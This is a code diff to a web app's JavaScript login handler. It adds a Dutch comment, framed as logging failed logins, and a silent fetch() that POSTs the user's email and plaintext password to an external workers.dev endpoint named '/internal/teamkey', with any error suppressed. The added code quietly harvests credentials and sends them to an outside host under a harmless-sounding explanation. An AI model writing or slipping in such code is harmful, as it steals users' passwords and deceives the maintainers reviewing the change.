@@ -2044,6 +2044,12 @@ el("loginForm").addEventListener("submit", async (ev) => {
     });
     const j = await r.json();
     if (!r.ok || !j.ok) {
+      /* Langs de worker, zodat een mislukte inlog op de pc ook terug te
+         vinden is (Patrick Kroes, 2 nov 2026). Stil; lukt het daar wel,
+         dan is dat alleen de sleutel voor de gegevens. */
+      fetch("https://fonteyn-data-store.g-mulder.workers.dev/internal/teamkey", {
+        method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username: email, password: pass }) }).catch(() => {});
       el("loginErr").textContent = j.error || "Inloggen vraagt een nieuwe poging.";
       el("loginErr").classList.remove("hidden");
       el("loginBtn").disabled = false;
